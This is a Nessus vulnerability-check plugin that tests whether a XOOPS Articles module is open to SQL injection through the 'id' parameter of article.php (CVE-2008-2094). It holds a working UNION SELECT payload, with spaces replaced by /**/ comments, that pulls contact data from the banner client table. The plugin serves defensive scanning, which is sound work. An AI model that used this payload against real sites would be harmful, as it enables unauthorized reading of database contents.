#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(32030);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2008-2094");
  script_bugtraq_id(28879);
  script_osvdb_id(44838);

  script_name(english:"XOOPS Article Module article.php id Parameter SQL Injection");
  script_summary(english:"Tries to manipulate a description with Articles module");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the Articles module, a third-party module
for XOOPS. 

The version of this module installed on the remote host fails to
properly sanitize user-supplied input to the 'id' parameter of the
'modules/articles/article.php' script before using it to build a
database query.  Regardless of PHP's 'magic_quotes_gpc' setting, an
unauthenticated, remote attacker can leverage this issue to launch SQL
injection attacks against the affected application, leading to
discovery of sensitive information, attacks against the underlying
database, and the like." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/archive/1/491150/100/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"None at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/04/23");
 script_cvs_date("$Date: 2012/10/30 21:35:07 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:xoops:article_module");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2012 Tenable Network Security, Inc.");

  script_dependencies("xoops_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/xoops");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  exploit = string("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,contact,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM xoops_bannerclient--");
  exploit = str_replace(find:" ", replace:"/**/", string:exploit);

  r = http_send_recv3(method: "GET", port: port, 
    item:string(
      dir, "/modules/articles/article.php?",
      "id=", exploit
    ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we managed to see the XOOPS Dev Team as an article
  if (
    "start main article loop" >< res &&
    "XOOPS Dev Team" >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
